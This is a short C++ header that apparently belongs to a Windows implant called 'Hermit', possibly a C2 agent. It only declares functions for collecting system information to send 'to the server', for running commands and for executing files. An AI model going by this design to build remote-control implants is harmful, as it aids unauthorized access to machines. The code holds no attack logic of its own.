#ifndef HERMIT_WINSYSTEM_HPP
#define HERMIT_WINSYSTEM_HPP

#include <windows.h>
#include <string>
#include "common.hpp"
#include "convert.hpp"

std::wstring GetArch(WORD wProcessorArchitecture);
// Get system information as json for sending it to the server.
std::wstring GetInitialInfo();
std::wstring ExecuteCmd(const std::wstring& cmd);
BOOL ExecuteFile(const std::wstring& filePath);

#endif // HERMIT_WININFO_HPP